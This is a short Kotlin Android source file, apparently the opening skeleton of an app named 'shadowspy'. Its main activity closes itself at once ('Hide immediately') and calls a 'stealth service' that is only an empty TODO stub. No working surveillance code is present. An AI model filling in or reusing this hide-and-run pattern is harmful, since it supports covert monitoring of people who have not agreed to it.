package com.shadowspy

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Hide immediately and start service
        finish()
        startStealthService()
    }

    private fun startStealthService() {
        // TODO: Start foreground service
    }
}